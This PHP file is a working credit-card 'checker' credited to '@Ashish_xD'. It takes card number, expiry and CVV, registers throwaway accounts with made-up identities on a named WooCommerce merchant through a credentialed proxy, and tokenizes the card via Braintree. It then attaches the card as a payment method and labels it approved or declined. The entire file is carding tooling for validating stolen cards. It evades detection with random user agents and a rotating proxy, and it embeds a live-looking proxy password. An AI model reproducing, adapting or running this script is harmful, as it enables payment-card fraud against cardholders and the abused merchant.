<?php

ob_start();

$Gate = 'Braintree Auth';
$credits = "@Ashish_xD";

error_reporting(1);
date_default_timezone_set('America/Buenos_Aires');

#---///[START]\\\---#

if (file_exists(getcwd().'/cookie.txt')) {
    @unlink('cookie.txt');
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  return explode($end, $str[1])[0];
}

function Gen_Randi_U_A()
{
  $platforms = ['Windows NT', 'Macintosh', 'Linux', 'Android', 'iOS'];
  $browsers = ['Mozilla', 'Chrome', 'Opera', 'Safari', 'Edge', 'Firefox'];
  $platform = $platforms[array_rand($platforms)];
  $version = rand(11, 99) . '.' . rand(11, 99);
  $browser = $browsers[array_rand($browsers)];
  $chromeVersion = rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999);
  return "$browser/5.0 ($platform " . rand(11, 99) . ".0; Win64; x64) AppleWebKit/$version (KHTML, like Gecko) $browser/$version.$chromeVersion Safari/$version." . rand(11, 99);
}

$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $list);
$cc = $list[0][0];
$mes = $list[0][1];
$ano = $list[0][2];
$cvv = $list[0][3];

if (empty($lista)) {
echo '[-] Status: #Error ⚠️ | INVALID FORMAT | Card Not Found | '.$Gate.' | '.$credits.'
<br><br>';
return;
}

# Random USA Person Details - #API

$names = ['Ashish', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William'];
$last_names = ['Mishra', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Martinez'];
$company_Names = ['BinBhaiFamily', 'TechSolutions', 'InnovateHub', 'EpicTech', 'CodeMasters', 'WebWizards', 'DataGenius', 'SmartTech', 'QuantumSystems', 'DigitalCrafters'];
$streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln', 'Elm St', 'Springfield Dr', 'Highland Ave', 'Meadow Ln', 'Sunset Blvd'];
$cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose'];
$phones = ['682', '346', '246'];
$state_data = [
    'NY' => 'New York',
    'CA' => 'California',
    'TX' => 'Texas',
    'FL' => 'Florida',
    'PA' => 'Pennsylvania',
    'IL' => 'Illinois',
    'OH' => 'Ohio',
    'GA' => 'Georgia',
    'NC' => 'North Carolina',
    'MI' => 'Michigan'
];
$zips = [
    'NY' => '10001',
    'CA' => '90001',
    'TX' => '75001',
    'FL' => '33101',
    'PA' => '19101',
    'IL' => '60601',
    'OH' => '44101',
    'GA' => '30301',
    'NC' => '28201',
    'MI' => '48201'
];

$name = ucfirst($names[array_rand($names)]);
$last = ucfirst($last_names[array_rand($last_names)]);
$com = ucfirst($company_Names[array_rand($company_Names)]);
$street = rand(100, 9999) . ' ' . $streets[array_rand($streets)];
$city = $cities[array_rand($cities)];
$state_code = array_rand($state_data);
$state = $state_data[$state_code];
$zip = $zips[$state_code];
$phone = $phones[array_rand($phones)] . rand(1000000, 9999999);
$email_domain = ['outlook.com', 'yahoo.co.uk', 'gmail.com', 'hotmail.co.uk', 'btinternet.com'];
$mail = strtolower($name).'.'.strtolower($last).rand(100, 999).'@'.$email_domain[array_rand($email_domain)];
#$mail = 'ashishxd@telegmail.com';

# Bin Check - #API

$bin = substr($cc,0,6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.voidex.dev/api/bin?bin=$bin");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result0 = curl_exec($ch);
$time0 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$data = json_decode($result0, true);

$bin_info = "{$data['brand']} - {$data['type']} - {$data['level']} | {$data['bank']} - {$data['country']} [{$data['country_flag']}]";

# Retry - Limits

$retry = 0;
start:

$plink = 'proxy.proxyverse.io:9200';
$puser = 'country-worldwide'; 
$ppass = '76684a24-085c-40f6-8c1b-bfc2f900e4b2';

$ch = curl_init('https://api.ipify.org/'); 
curl_setopt_array($ch, [ 
CURLOPT_RETURNTRANSFER => true, 
CURLOPT_PROXY => "http://$plink", 
CURLOPT_PROXYUSERPWD => "$puser:$ppass", 
CURLOPT_HTTPGET => true, 
]); 
$ip1 = curl_exec($ch);
curl_close($ch);

# 1st Request - Register Page

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$plink");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_URL, 'https://loweryenterprisesllc.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
$time1 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

# 2nd Request - Register Account

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$plink");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_URL, 'https://loweryenterprisesllc.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$mail.'&email='.$mail.'&password=Anon%40000%4000&woocommerce-register-nonce='.GetStr($result1,'name="woocommerce-register-nonce" value="','"').'&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&register=Register');
$result2 = curl_exec($ch);
$time2 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

#-----[Retry [Error] Response]-----#

if ((strpos($result2,"An account is already registered with your email address.")) || (strpos($result2,"Error: An account is already registered with your email address.")) || (strpos($result2,"Error: An account is already registered with your email address. Please log in."))){
if ($retry == 1) {
echo '[-] Status: #Error ⚠️ | '.$lista.' | LIMIT EXCEEDED | Retry Limit Reached Error in 2nd Request - (email-already-exists) | '.$bin_info.' | '.number_format(($time1 + $time2), 1).'s | '.$Gate.' | '.$credits.'<br><br>';
echo 'Retry limit reached. Exiting...';
return;
}
$retry++;
goto start;
}

# 3rd Request - Set Billing Information

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$plink");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_URL, 'https://loweryenterprisesllc.com/my-account/edit-address/billing/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company='.$com.'&billing_country=US&billing_address_1='.$street.'&billing_address_2=&billing_city='.$city.'&billing_state='.$state.'&billing_postcode='.$zip.'&billing_phone='.$phone.'&billing_email='.$mail.'&save_address=Save+address&woocommerce-edit-address-nonce='.GetStr($result2,'name="woocommerce-edit-address-nonce" value="','"').'&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address');
$result3 = curl_exec($ch);
$time3 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

# 4th Request - Add Payment Page

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$plink");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_URL, 'https://loweryenterprisesllc.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result4 = curl_exec($ch);
$time4 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

# 5th Request - Generate Client Token

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$plink");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_URL, 'https://loweryenterprisesllc.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wc_braintree_credit_card_get_client_token&nonce='.GetStr($result4,'"client_token_nonce":"','"').'');
$result5 = curl_exec($ch);
$time5 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

# 6th Request - Authorizing Credit Card

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$plink");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'authorization: Bearer '.GetStr(base64_decode(GetStr($result5, '"data":"','"')), '"authorizationFingerprint":"','",').'',
'braintree-version: 2018-05-10',
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.substr(sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x%04x%04x', ...array_map('mt_rand', array_fill(0, 10, 1), array_fill(0, 10, 65535))), 0, 36).'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.(strlen($mes) == 1 ? "0$mes" : $mes).'","expirationYear":"'.(strlen($ano) == 2 ? "20$ano" : $ano).'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$result6 = curl_exec($ch);
$time6 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

# 7th Request - Charge & Refund $0.01 For Authorize Card

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://$plink");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_URL, 'https://loweryenterprisesllc.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'User-Agent: '.Gen_Randi_U_A().'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type='.GetStr($result6,'"brandCode":"','"').'&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce='.GetStr($result6,'"token":"','"').'&wc_braintree_device_data=%7B%22correlation_id%22%3A%22'.uniqid().'%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%22'.uniqid().'%22%7D&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=GBP&wc_braintree_paypal_locale=en_gb&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce='.GetStr($result4,'name="woocommerce-add-payment-method-nonce" value="','"').'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
$result = curl_exec($ch);
$time7 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$time = number_format(($time0 + $time1 + $time2 + $time3 + $time4 + $time5 + $time6 + $time7), 1);

#-----[CVV [Auth] Response]-----#

if ((strpos($result, 'Nice! New payment method added')) || (strpos($result, 'Payment method successfully added.'))){
echo '<br>"Status":"1000:Approved ✅"<br>
    <br>"Card":"'.$lista.'"<br>
    <br>"Response":"Payment method successfully added."<br>';
return;
}

#-----[CCN [Auth] Response]-----#

elseif (strpos($result, 'Reason: CVV')){
echo '<br>"Status":"CCN Approved ✅"<br>
    <br>"Card":"'.$lista.'"<br>
    <br>"Response":"Reason: CVV"<br>';
return;
}

$Respo = GetStr($result,'Status code ','</li>') ?: 'N/A';

#-----[Retry Response]-----#

if (strpos($result, 'Access denied')) {
if ($retry == 1) {
echo '[-] Status: #Error ⚠️ | '.$lista.' | LIMIT EXCEEDED | Retry Limit Reached Error in Last Request - (access-denied) | '.$time.'s | '.$Gate.' | '.$credits.'<br><br>';
echo 'Retry limit reached. Exiting...';
return;
}
$retry++;
goto start;
}

if (strpos($result, '403 Forbidden')) {
if ($retry == 1) {
echo '[-] Status: #Error ⚠️ | '.$lista.' | LIMIT EXCEEDED | Retry Limit Reached Error in Last Request - (403-forbidden) | '.$time.'s | '.$Gate.' | '.$credits.'<br><br>';
echo 'Retry limit reached. Exiting...';
return;
}
$retry++;
goto start;
}

if (empty($Respo)) {
if ($retry == 1) {
echo '[-] Status: #Error ⚠️ | '.$lista.' | LIMIT EXCEEDED | Retry Limit Reached Error in Last Request - ($respo) | '.$time.'s | '.$Gate.' | '.$credits.'<br><br>';
echo 'Retry limit reached. Exiting...';
return;
}
$retry++;
goto start;
}

#-----[CVV [Insufficient] Response]-----#

if (strpos($result,"Insufficient Funds")){
echo '<br>"Status":"1000:Approved ✅"<br>
    <br>"Card":"'.$lista.'"<br>
    <br>"Response":"Insufficient Funds"<br>';
}

#-----[CCN [Live] Response]-----#

elseif ((strpos($result, 'Gateway Rejected: avs_and_cvv')) || (strpos($result, 'Card Issuer Declined CVV')) || (strpos($result, 'Gateway Rejected: cvv'))){
echo '<br>"Status":"CCN Approved ✅"<br>
    <br>"Card":"'.$lista.'"<br>
    <br>"Response":"'.$Respo.'"<br>';
}

#-----[CVV [AVS Failed] Response]-----#

elseif (strpos($result, 'Gateway Rejected: avs')){
echo '<br>"Status":"1000:Approved ✅"<br>
    <br>"Card":"'.$lista.'"<br>
    <br>"Response":"Gateway Rejected: avs"<br>';
}

#-----[Dead Response]-----#

elseif (strpos($result, $Respo)){
echo '<br>"Status":"Declined ❌"<br>
    <br>"Card":"'.$lista.'"<br>
    <br>"Response":"'.$Respo.'"<br>';  
}

#-----[Error Response]-----#

else {
echo '<br>"Status":"Declined ❌"<br>
    <br>"Card":"'.$lista.'"<br>
    <br>"Response":"Unknown Error Occurred ⚠️"<br>';  
    
file_put_contents('B3_Auth_Error.txt', $lista."\n\n".$result."\n\n\n\n".PHP_EOL , FILE_APPEND | LOCK_EX);
}

#echo "<br><b>1:</b> $result1<br><br>";
#echo "<br><b>2:</b> $result2<br><br>";
#echo "<br><b>3:</b> $result3<br><br>";
#echo "<br><b>4:</b> $result4<br><br>";
#echo "<br><b>5:</b> $result5<br><br>";
#echo "<br><b>6:</b> $result6<br><br>";
#echo "<br><b>7:</b> $result<br><br>";
#echo "<br><b>RESPONSE:</b> $Respo<br><br>";


ob_flush();
unlink('cookie.txt');

#---///[THE END]\\\---#

?>
